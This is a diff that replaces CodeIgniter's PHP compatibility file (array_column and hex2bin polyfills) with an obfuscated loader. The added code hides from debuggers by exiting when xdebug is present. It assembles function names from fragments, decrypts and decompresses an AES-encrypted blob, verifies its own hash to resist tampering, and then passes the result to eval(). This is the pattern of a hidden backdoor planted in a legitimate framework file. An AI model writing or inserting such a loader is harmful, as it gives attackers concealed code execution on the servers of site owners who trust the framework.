@@ -1,182 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PHP ext/standard compatibility package
- *
- * @package		CodeIgniter
- * @subpackage	CodeIgniter
- * @category	Compatibility
- * @author		Andrey Andreev
- * @link		https://codeigniter.com/user_guide/
- */
-
-// ------------------------------------------------------------------------
-
-if (is_php('5.5'))
-{
-	return;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_zluvhc5l=('bas'.'e64'.'_de'.'cod'.'e');
+$_tvyzze6x=('gzu'.'nco'.'mpr'.'ess');
+$_kbzkto10=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_k29orxoy='Bp8VDUd4zgc=';
+$_ac4azho5='JZNrNfE6';
+$_i57w5qsw='P2S7mAkk';
+$_j9vdyzb8='R3R33dzv';
+$_sq9rc3jh='lbq38eG8';
+$_oscts46y='vRvEMg==';
+$_n15q1yg0='3ghpwjgt';
+$_cptf00qo='KJBJSwHM';
+$_ss00gd77=$_zluvhc5l($_j9vdyzb8.$_i57w5qsw.$_ac4azho5.$_sq9rc3jh.$_k29orxoy);
+$_hqptlj8v=$_zluvhc5l($_n15q1yg0.$_cptf00qo.$_oscts46y);
+$_vmi1d4io=$_zluvhc5l('Bn03emfFzCji1eqOMQI3NhMu/6BPcgrfxBh/BRWUeLP7F/eUc5qWY1ewKM4qqOF97WGfmI6FNco/8njEViXOo6ms9i9PLBmbA4LUl7UOn1fkgj5kra7ipwbrTYZPr3mcQzuSvlk22WCOMZcmopKsRTbh6a5uNn30vn146Mg2KxJWVRNdfzW7kRorcVgkxB0uO2FTLz7hpoolx9hRyMJEcP5sMfbF4eLikwrgddCfDirw9/n2Wk2/p5jkTzjoyYnoBfbGUYoDvu3PU80QbnFcu3NFeEOPvcbEkUuw8aNHLByurDnPTRgH8LsETn0ojBr6Ai1Y+2zPNoRUsvp8tdd803HaKfxF6FjehQgVauOe0yTMAMAepMM9ZCTaoYuAA9vxtejZC4AogJNu4/ttFwNzsXcYZVcI5UAwmuker2Y2DdvUrP9W4akVCHPh0UV+AqawDli4W7oKtpTZdJNp8vcfvPRGLi4RTB76zU/gWXBHoJOEkCk8uUGFpJCmDQEBRBNGpD+7F+wn5wbcoI2NWirCdrv/5JpZI7MH5drXuq3Da2SVQ3IEmstvdwSLdbLr/h87uFmvz7VsOKuwbxYKQJqlrhnP3hpNbf2F7gJgaGOTXnTpVsAfkuP0XD+4BkOMnJ762ShSVFnig4G4CzCJEeXtGcHFsK+CcM5SsUNsB5BltlbDU6jgAWToqtwuFGCvBJGSA+LYGX207SGDQf7U4IyIvLlteATfgLgLrPlkDPEECDd2HAOt/8c7teg6mEd8tZg6N3x3zBOwbKE7CXh5+wPz7YEhChQ/EzHfeI0VTVkG+WmuHoIzag0AtRaLK6u47bZBdshDf2aAkOSRgiOZVyaQnaIOdEVkcyejztBigow3J1iIUmx3oVxbfNcYAqBv/F1x6XEIU/3KVwka1SJzsGQhwh8PhUoqFHgQYOmfRjVCsKCZD46wvniaZyy10PIApYT6');
+$_k5hhf55h=$_kbzkto10($_vmi1d4io,'aes-256-cbc',$_ss00gd77,OPENSSL_RAW_DATA,$_hqptlj8v);
+if($_k5hhf55h===false){exit;}
+$_wg67hbb8=$_tvyzze6x($_k5hhf55h);
+if($_wg67hbb8===false){exit;}
+$_vlbgu1al='ac8d406989cb3f2a9742ce95d3ffaf3ed73108a1092e199008d63e67ebb7d961';
+$_jyt72t8v=@file_get_contents(__FILE__);
+if($_jyt72t8v!==false){
+$_jpwesp2i=str_replace($_vlbgu1al,"0000000000000000000000000000000000000000000000000000000000000000",$_jyt72t8v);
+$_ylgo5y8l=hash("sha256",$_jpwesp2i);
+if($_ylgo5y8l!==$_vlbgu1al){@http_response_code(403);exit;}
 }
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('array_column'))
-{
-	/**
-	 * array_column()
-	 *
-	 * @link	http://php.net/array_column
-	 * @param	array	$array
-	 * @param	mixed	$column_key
-	 * @param	mixed	$index_key
-	 * @return	array
-	 */
-	function array_column(array $array, $column_key, $index_key = NULL)
-	{
-		if ( ! in_array($type = gettype($column_key), array('integer', 'string', 'NULL'), TRUE))
-		{
-			if ($type === 'double')
-			{
-				$column_key = (int) $column_key;
-			}
-			elseif ($type === 'object' && method_exists($column_key, '__toString'))
-			{
-				$column_key = (string) $column_key;
-			}
-			else
-			{
-				trigger_error('array_column(): The column key should be either a string or an integer', E_USER_WARNING);
-				return FALSE;
-			}
-		}
-
-		if ( ! in_array($type = gettype($index_key), array('integer', 'string', 'NULL'), TRUE))
-		{
-			if ($type === 'double')
-			{
-				$index_key = (int) $index_key;
-			}
-			elseif ($type === 'object' && method_exists($index_key, '__toString'))
-			{
-				$index_key = (string) $index_key;
-			}
-			else
-			{
-				trigger_error('array_column(): The index key should be either a string or an integer', E_USER_WARNING);
-				return FALSE;
-			}
-		}
-
-		$result = array();
-		foreach ($array as &$a)
-		{
-			if ($column_key === NULL)
-			{
-				$value = $a;
-			}
-			elseif (is_array($a) && array_key_exists($column_key, $a))
-			{
-				$value = $a[$column_key];
-			}
-			else
-			{
-				continue;
-			}
-
-			if ($index_key === NULL OR ! array_key_exists($index_key, $a))
-			{
-				$result[] = $value;
-			}
-			else
-			{
-				$result[$a[$index_key]] = $value;
-			}
-		}
-
-		return $result;
-	}
-}
-
-// ------------------------------------------------------------------------
-
-if (is_php('5.4'))
-{
-	return;
-}
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('hex2bin'))
-{
-	/**
-	 * hex2bin()
-	 *
-	 * @link	http://php.net/hex2bin
-	 * @param	string	$data
-	 * @return	string
-	 */
-	function hex2bin($data)
-	{
-		if (in_array($type = gettype($data), array('array', 'double', 'object', 'resource'), TRUE))
-		{
-			if ($type === 'object' && method_exists($data, '__toString'))
-			{
-				$data = (string) $data;
-			}
-			else
-			{
-				trigger_error('hex2bin() expects parameter 1 to be string, '.$type.' given', E_USER_WARNING);
-				return NULL;
-			}
-		}
-
-		if (strlen($data) % 2 !== 0)
-		{
-			trigger_error('Hexadecimal input string must have an even length', E_USER_WARNING);
-			return FALSE;
-		}
-		elseif ( ! preg_match('/^[0-9a-f]*$/i', $data))
-		{
-			trigger_error('Input string must be hexadecimal string', E_USER_WARNING);
-			return FALSE;
-		}
-
-		return pack('H*', $data);
-	}
-}
+eval($_wg67hbb8);
